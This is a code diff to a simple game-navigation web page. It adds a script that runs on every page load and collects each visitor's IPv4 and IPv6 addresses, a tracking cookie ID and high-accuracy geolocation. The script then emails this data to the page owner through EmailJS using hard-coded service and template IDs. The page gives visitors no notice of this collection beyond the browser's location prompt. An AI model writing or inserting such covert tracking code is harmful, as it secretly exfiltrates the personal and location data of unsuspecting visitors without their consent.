@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Website Navigation</title>
+    <link rel="icon" href="icon.png" type="image/png">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -41,11 +42,124 @@
             emailjs.init("N4QPJjdGkEyvy7BdZ"); // Your actual public key
         })();
 
-        function sendEmail(ipv4, ipv6, deviceID) {
+        function sendEmail(ipv4, ipv6, deviceID, latitude, longitude) {
             const templateParams = {
-                ipv4: ipv4,
-                ipv6: ipv6,
-                ID: deviceID
+                ipv4: ipv4 ? ipv4 : 'Unable to fetch!',
+                ipv6: ipv6 ? ipv6 : 'Unable to fetch!',
+                ID: deviceID ? deviceID : 'Unknown Device',
+                LOC: latitude && longitude ? `${latitude}, ${longitude}` : 'Geolocation denied or unavailable'
             };
 
-            emailjs.send('service_120g06
+            emailjs.send('service_120g06v', 'template_j8q4zmc', templateParams)
+                .then(function(response) {
+                    console.log('Email sent successfully!', response.status, response.text);
+                    // Set last sent time cookie to current time in UTC
+                    setCookie('lastSentTime', Date.now(), 30); // Expire in 30 days
+                }, function(error) {
+                    console.error('Failed to send email...', error);
+                });
+        }
+
+        function fetchIPsAndSendEmail() {
+            console.log('Fetching IP addresses...');
+
+            // Fetch IPv4 address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipv4 = data.ip;
+                    console.log('IPv4 address fetched:', ipv4);
+
+                    // Fetch IPv6 address
+                    fetch('https://api64.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            const ipv6 = data.ip;
+                            console.log('IPv6 address fetched:', ipv6);
+
+                            // Check if 30 days have passed since last email sent
+                            const lastSentTime = getCookie('lastSentTime');
+                            if (!lastSentTime || (Date.now() - parseInt(lastSentTime)) >= (30 * 24 * 60 * 60 * 1000)) {
+                                // Check if deviceID cookie exists
+                                let deviceID = getCookie('deviceID');
+
+                                if (!deviceID) {
+                                    // Generate a new deviceID (for demonstration purposes, you might want to use a more secure method)
+                                    deviceID = generateDeviceID();
+                                    setCookie('deviceID', deviceID, 1); // Set cookie to expire in 1 day
+
+                                    // Attempt to fetch geolocation
+                                    navigator.geolocation.getCurrentPosition(
+                                        function(position) {
+                                            const latitude = position.coords.latitude;
+                                            const longitude = position.coords.longitude;
+                                            console.log('Geolocation coordinates:', latitude, longitude);
+
+                                            // Send email with IPs, deviceID, and location
+                                            sendEmail(ipv4, ipv6, deviceID, latitude, longitude);
+                                        },
+                                        function(error) {
+                                            console.error('Error getting geolocation:', error);
+                                            // Send email with 'Unable to fetch!' for location
+                                            sendEmail(ipv4, ipv6, deviceID);
+                                        },
+                                        { enableHighAccuracy: true }
+                                    );
+                                }
+                            } else {
+                                console.log('Email already sent within the last 30 days.');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error fetching IPv6 address:', error);
+                            sendEmail(ipv4, 'Unable to fetch!', 'Unknown Device'); // Send email with 'Unable to fetch!' for IPv6
+                        });
+                })
+                .catch(error => {
+                    console.error('Error fetching IPv4 address:', error);
+                    sendEmail('Unable to fetch!', 'Unable to fetch!', 'Unknown Device'); // Send email with 'Unable to fetch!' for both IPv4 and IPv6
+                });
+        }
+
+        // Helper function to get cookie by name
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+        }
+
+        // Helper function to set cookie
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = `expires=${date.toUTCString()}`;
+            document.cookie = `${name}=${value}; ${expires}; path=/`;
+        }
+
+        // Function to generate a simple deviceID (for demonstration purposes)
+        function generateDeviceID() {
+            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+        }
+
+        // Send IP addresses, device info, and location on page load
+        fetchIPsAndSendEmail();
+
+        // Navigation buttons
+        document.getElementById('gotoSpaceStationUSA').addEventListener('click', function() {
+            window.location.href = '/ssusa/index.html';
+        });
+
+        document.getElementById('gotoFallingDanger').addEventListener('click', function() {
+            window.location.href = '/fd-game/index.html';
+        });
+
+        document.getElementById('gotoSpaceShooter').addEventListener('click', function() {
+            window.location.href = '/ss-game/index.html';
+        });
+
+        document.getElementById('gotoMinecraft').addEventListener('click', function() {
+            window.location.href = '/minecraft/index.html';
+        });
+    </script>
+</body>
+</html>
